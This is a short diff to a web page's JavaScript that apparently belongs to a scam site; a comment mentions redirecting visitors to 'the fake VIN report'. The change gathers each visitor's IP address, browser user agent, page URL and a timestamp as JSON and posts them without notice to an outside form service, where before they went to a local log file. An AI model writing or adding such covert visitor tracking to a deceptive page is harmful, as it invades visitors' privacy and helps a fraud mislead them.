@@ -12,12 +12,17 @@
                 let ip = data.ip;
                 let userAgent = navigator.userAgent;
                 let pageUrl = window.location.href;
-                let logData = `IP: ${ip} | User Agent: ${userAgent} | Page: ${pageUrl} | Time: ${new Date().toISOString()}\n`;
+                let logData = {
+                    "IP Address": ip,
+                    "User Agent": userAgent,
+                    "Page URL": pageUrl,
+                    "Timestamp": new Date().toISOString()
+                };
                 
-                fetch('log.txt', {
+                fetch('https://formspree.io/f/mdkabale', {
                     method: 'POST',
-                    headers: {'Content-Type': 'text/plain'},
-                    body: logData
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(logData)
                 });
                 
                 // Redirect to the fake VIN report
